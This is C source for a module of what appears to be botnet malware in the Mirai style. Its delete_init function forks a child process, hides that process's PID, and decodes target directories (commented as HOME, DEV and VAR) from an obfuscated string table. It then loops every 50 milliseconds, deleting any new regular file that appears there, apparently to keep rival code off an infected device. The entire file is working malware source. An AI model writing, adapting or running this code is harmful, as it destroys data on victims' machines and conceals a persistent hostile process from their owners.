#define _GNU_SOURCE

#include <dirent.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include "dbg.h"
#include "bool.h"
#include "util.h"
#include "hide.h"
#include "table.h"

// #define WATCH_DIR "/tmp"
#define MAX_FILES 2048
#define NAME_LEN 256

static uint8_t dirs[] = {
    TABLE_HIK_DIR1, // HOME
    TABLE_HIK_DIR2, // DEV
    TABLE_HIK_DIR3 // VAR
};

static char known_files[MAX_FILES][NAME_LEN];
static int known_count = 0;

static int is_known(const char *name) {
    int i;
    for (i = 0; i < known_count; i++) {
        if (!strcmp(known_files[i], name))
            return 1;
    }
    return 0;
}

static void add_known(const char *name) {
    if (known_count >= MAX_FILES) return;
    
    int len = strlen(name);
    if (len >= NAME_LEN) len = NAME_LEN - 1;
    
    int i;
    for (i = 0; i < len; i++) {
        known_files[known_count][i] = name[i];
    }
    known_files[known_count][len] = '\0';
    known_count++;
}

static void scan_and_delete_new(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;
    
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        // Skip . and .. entries
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
        
        // Only process regular files, skip directories
        if (entry->d_type != DT_REG) continue;
        
        // if failed to previously delete, skip
        if (is_known(entry->d_name)) continue;
        
        char full_path[512];
        int path_len = 0;
        
        while (*dir_path && path_len < 510) {
            full_path[path_len++] = *dir_path++;
        }
        if (path_len < 511) full_path[path_len++] = '/';
        
        const char *file_name = entry->d_name;
        while (*file_name && path_len < 511) {
            full_path[path_len++] = *file_name++;
        }
        full_path[path_len] = '\0';
        
        DEBUG_PRINT("[delete] deleted file: (\'%s\')\n", full_path);
#ifndef DEBUG
        if (unlink(full_path) != 0)
            add_known(entry->d_name);
#endif
    }
    
    closedir(dir);
}

void delete_init(void) {
    if (fork() != 0) {
        sleep(1);
    	  return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[delete_init] started: (\'%d\')\n", getpid());
    
    for (unsigned int i = 0; i < (sizeof(dirs) / sizeof(dirs[0])); i++)
        table_unlock_val(dirs[i]);
    
    while (TRUE) {
        for (unsigned int i = 0; i < (sizeof(dirs) / sizeof(dirs[0])); i++)
            scan_and_delete_new(table[dirs[i]].str);
        usleep(50000);
    }
    
    for (unsigned int i = 0; i < (sizeof(dirs) / sizeof(dirs[0])); i++)
        table_lock_val(dirs[i]);

    exit(0);
}
